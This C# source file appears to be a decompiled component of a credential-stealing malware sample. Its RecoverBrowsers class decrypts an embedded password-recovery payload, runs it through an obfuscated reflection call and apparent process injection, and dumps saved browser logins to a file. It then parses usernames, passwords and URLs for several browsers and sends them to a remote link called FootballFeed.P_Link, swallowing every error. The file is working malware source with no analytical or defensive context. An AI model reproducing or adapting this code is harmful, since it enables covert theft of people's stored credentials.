using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class RecoverBrowsers
{
	private string R_List;

	public RecoverBrowsers()
	{
		R_List = ReadFile();
	}

	public void Chrome()
	{
		FandS("Chrome");
	}

	public void Firefox()
	{
		FandS("Firefox");
	}

	public void InternetExplorer()
	{
		FandS("Internet Explorer");
	}

	public void Opera()
	{
		FandS("Opera");
	}

	public void Safari()
	{
		FandS("Safari");
	}

	public void FandS(string Browser)
	{
		try
		{
			int count = Regex.Matches(R_List, Regex.Escape("URL")).Count;
			for (int i = 0; i < count; i = checked(i + 1))
			{
				string between = GetBetween(R_List, "User Name         : ", "\r\n", i);
				string between2 = GetBetween(R_List, "Password          : ", "\r\n", i);
				string between3 = GetBetween(R_List, "URL               : ", "\r\n", i);
				string between4 = GetBetween(R_List, "Web Browser       : ", "\r\n", i);
				if (Contains(between4, Browser))
				{
					Send.SendLog(FootballFeed.P_Link, "Passwords", null, null, between4, between3, between, between2, null);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool Contains(string NameInList, string Compare)
	{
		if (NameInList.Contains(Compare))
		{
			return true;
		}
		return false;
	}

	public string ReadFile()
	{
		string result = null;
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Browsers.txt");
		try
		{
			if (!File.Exists(path))
			{
				Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG"))!.Invoke(null, null);
				ResourceManager resourceManager = new ResourceManager("Key", assembly);
				byte[] bytes = Encoding.Unicode.GetBytes("Password");
				string executablePath = Application.get_ExecutablePath();
				string cmd = "/stext " + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Browsers.txt");
				byte[] byte_ = (byte[])resourceManager.GetObject("RecoverBrowsers");
				GClass0.smethod_0(executablePath, cmd, Encryption.RSMDecrypt(byte_, bytes), compatible: false);
				while (!File.Exists(path))
				{
					Thread.Sleep(1000);
				}
			}
			result = File.ReadAllText(path);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public string GetBetween(string input, string str1, string str2, int ind)
	{
		string input2 = Regex.Split(input, str1)[checked(ind + 1)];
		return Regex.Split(input2, str2)[0];
	}
}
